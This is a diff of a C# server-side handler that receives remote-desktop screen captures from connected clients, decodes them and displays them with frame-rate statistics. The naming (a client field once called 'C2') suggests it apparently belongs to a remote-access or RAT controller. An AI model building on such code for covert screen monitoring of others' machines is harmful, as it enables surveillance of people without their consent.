@@ -1,7 +1,7 @@
 ﻿using Server.Forms;
 using Server.Helper;
 using Server.MessagePack;
-using Server.Sockets;
+using Server.Connection;
 using System;
 using System.Diagnostics;
 using System.Drawing;
@@ -10,58 +10,52 @@ using System.Windows.Forms;
 
 namespace Server.Handle_Packet
 {
-   public class HandleRemoteDesktop
+    public class HandleRemoteDesktop
     {
         public void Capture(Clients client, MsgPack unpack_msgpack)
         {
             try
             {
-                if (Program.form1.InvokeRequired)
+                FormRemoteDesktop RD = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
+                try
                 {
-                    Program.form1.BeginInvoke((MethodInvoker)(() =>
+                    if (RD != null)
                     {
-                        FormRemoteDesktop RD = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
-                        try
+                        if (RD.Client == null)
                         {
-                            if (RD != null)
-                            {
-                                if (RD.C2 == null)
-                                {
-                                    RD.C2 = client;
-                                    RD.timer1.Start();
-                                    byte[] RdpStream0 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
-                                    Bitmap decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream0));
-                                    RD.rdSize = decoded0.Size;
-                                   // RD.Size = new Size(decoded0.Size.Width / 2, decoded0.Size.Height / 2);
-                                }
-                                byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
-                                Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
-
-                                int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
-                                RD.numericUpDown2.Maximum = Screens - 1;
-
-                                if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
-                                {
-                                    RD.pictureBox1.Image = (Bitmap)decoded;
-                                    RD.RenderSW = Stopwatch.StartNew();
-                                }
-                                RD.FPS++;
-                                if (RD.sw.ElapsedMilliseconds >= 1000)
-                                {
-                                    RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
-                                    RD.FPS = 0;
-                                    RD.sw = Stopwatch.StartNew();
-                                }
-                            }
-                            else
-                            {
-                                client.Disconnected();
-                                return;
-                            }
+                            RD.Client = client;
+                            RD.timer1.Start();
+                            byte[] RdpStream0 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
+                            Bitmap decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream0));
+                            RD.rdSize = decoded0.Size;
+                            RD.labelWait.Visible = false;
                         }
-                        catch (Exception ex) { Debug.WriteLine(ex.Message); }
-                    }));
+                        byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
+                        Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
+
+                        int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
+                        RD.numericUpDown2.Maximum = Screens - 1;
+
+                        if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
+                        {
+                            RD.pictureBox1.Image = decoded;
+                            RD.RenderSW = Stopwatch.StartNew();
+                        }
+                        RD.FPS++;
+                        if (RD.sw.ElapsedMilliseconds >= 1000)
+                        {
+                            RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
+                            RD.FPS = 0;
+                            RD.sw = Stopwatch.StartNew();
+                        }
+                    }
+                    else
+                    {
+                        client.Disconnected();
+                        return;
+                    }
                 }
+                catch (Exception ex) { Debug.WriteLine(ex.Message); }
             }
             catch { }
         }
